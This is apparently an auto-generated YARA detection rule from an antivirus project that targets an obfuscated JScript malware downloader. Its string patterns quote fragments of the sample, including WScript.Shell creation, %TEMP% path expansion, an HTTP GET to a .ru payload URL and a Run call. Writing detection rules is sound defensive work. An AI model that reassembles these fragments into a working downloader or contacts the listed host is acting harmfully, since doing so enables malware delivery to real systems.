rule sig_20160427_3b3c3e15d15158d17b50dac67c5143fd {
  meta:
    description = "datamaliciousorder - file 20160427_3b3c3e15d15158d17b50dac67c5143fd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9f41450e3d17bb1dcf10a00317da89615cc47dbda9748f223be00ba1844122c4"

  strings:
    $s1  = "function UvaicPfuua() {return JqkmhPnuuz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ItZD4D8" ascii
    $s2  = "function UvaicPfuua() {return JqkmhPnuuz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ItZD4D8" ascii
    $s3  = "function DdvboNxbhn(EqpmhDfrxj, XootwBsqpn){OfbudAbbuc = OfbudAbbuc * 1; return EqpmhDfrxj - XootwBsqpn;};" fullword ascii
    $s4  = "var JqkmhPnuuz = function BfgkbArdle() {return CxbxpRbsyc[FmbwmXgazw](\"WScript\"+\".Shell\");}(), XzhreZgjdl = 11;" fullword ascii
    $s5  = "BwcrqHafua[TxsppLqpkx](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var CxbxpRbsyc = this[\"WScript\"];" fullword ascii
    $s7  = "if (BwcrqHafua[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function UkqzaEhefr(){return SzmdxCirzc + \"\";};" fullword ascii
    $s9  = "function XcrvuHpato() {return ((EtmetVhfwo == true) && (EtmetVhfwo == TrsaqDagjo)) ? 1 : OfbudAbbuc;};" fullword ascii
    $s10 = "function DaktdNbrel(){return 23;};" fullword ascii
    $s11 = "function BlnelDpajf(){return FmbwmXgazw;};" fullword ascii
    $s12 = "FlkwaXfjdv = true;" fullword ascii
    $s13 = "TrsaqDagjo = true; " fullword ascii
    $s14 = "function BgdwpXnohf(XfdkcRvebl) {var RlaosHfujv = (1, 2, 3, 4, 5, XfdkcRvebl); return RlaosHfujv;};" fullword ascii
    $s15 = "function BaiecMxemc()" fullword ascii
    $s16 = "var VaiyiMtpzj = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "return DdvboNxbhn(IydonJzsia, TugykBiosx);" fullword ascii
    $s18 = "function DizzrFuvgw(PxebpVqkog){JqkmhPnuuz[\"R\"+\"un\"](PxebpVqkog, OfbudAbbuc, OfbudAbbuc);};" fullword ascii
    $s19 = "}while (UzrxeRpfsg);" fullword ascii
    $s20 = "var TrsaqDagjo = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}